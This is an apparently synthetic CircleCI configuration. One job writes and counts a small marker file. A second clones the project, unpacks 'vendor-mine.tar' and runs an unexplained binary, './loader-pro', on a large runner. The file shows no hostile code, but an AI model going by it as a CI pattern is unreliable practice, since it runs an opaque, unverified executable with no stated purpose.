jobs:
  HashedPageProxy:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Build step-4 output
          command: |
            mkdir -p /tmp/aux3
            { set +o pipefail 2>/dev/null; echo 'ready' >/tmp/oliveotter.txt && wc -c </tmp/oliveotter.txt; true ; } > /tmp/aux3/9ham6z0y8w4ww
            echo "gate CORE-19: $(wc -c </tmp/aux3/9ham6z0y8w4ww) bytes total"
      - persist_to_workspace:
          root: /tmp/aux3
          paths:
            - '9ham6z0y8w4ww'
  CORE-19:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/aux3
      - run:
          name: Pull 2
          command: |
            cat /tmp/aux3/9ham6z0y8w4ww
      - run:
          name: Fetch sources only
          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Extract sources
          command: tar --extract -f vendor-mine.tar
      - run:
          name: Settle filesystem
          command: sleep 30
      - run:
          command: uname -a
      - run:
          command: g++ --version
      - run:
          command: nice -n 0 ./loader-pro
